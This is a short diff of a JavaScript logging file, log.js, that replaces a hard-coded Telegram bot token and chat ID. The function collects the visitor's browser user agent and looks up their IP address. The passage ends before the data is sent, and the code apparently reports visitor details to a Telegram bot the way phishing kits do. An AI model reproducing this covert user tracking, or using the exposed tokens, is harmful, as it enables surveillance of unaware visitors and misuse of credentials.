@@ -1,7 +1,7 @@
 // log.js - Telegram bildirim fonksiyonu (export'suz)
 function sendLog(fileUrl) {
-  const token = '8661029560:AAFxEaxyqJkegxR6XAtKMN-GAY8si2ZnNMo';
-  const chatId = '-5297334849';
+  const token = '8163053912:AAHVNTHM3O2LRcChxvclnM8ONUELtMdFRa8';
+  const chatId = '-1002478190818';
   const userAgent = navigator.userAgent;
 
   return fetch('https://api.ipify.org?format=json')
